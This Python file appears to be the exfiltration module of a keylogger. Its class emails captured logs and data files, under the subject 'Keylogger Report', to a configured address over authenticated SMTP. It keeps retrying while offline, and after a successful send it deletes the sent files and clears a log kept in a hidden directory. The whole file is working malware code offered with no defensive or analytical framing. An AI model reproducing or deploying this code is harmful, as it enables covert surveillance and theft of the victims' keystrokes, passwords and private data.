import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os
import time
import shutil
from config import *

class EmailSender:
    def __init__(self):
        self.unsent_files = []

    def send_email(self, attachments):
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = "Keylogger Report"

        body = "Attached are the collected logs and data."
        msg.attach(MIMEText(body, 'plain'))

        for filepath in attachments:
            if filepath and os.path.exists(filepath):
                with open(filepath, 'rb') as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                    encoders.encode_base64(part)
                    part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(filepath)}')
                    msg.attach(part)

        try:
            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
            server.quit()
            print("Email sent successfully")
            return True
        except Exception as e:
            print(f"Failed to send email: {e}")
            return False

    def send_with_retry(self, files):
        while True:
            if self.send_email(files):
                # Delete all files after successful send
                for f in files:
                    if f and os.path.exists(f):
                        os.remove(f)
                # Also clear the main log file (but keep empty file)
                log_path = os.path.join(HIDDEN_DIR, LOG_FILE)
                if os.path.exists(log_path):
                    open(log_path, 'w').close()
                break
            else:
                print(f"Offline, retrying in {OFFLINE_RETRY_INTERVAL} sec...")
                time.sleep(OFFLINE_RETRY_INTERVAL)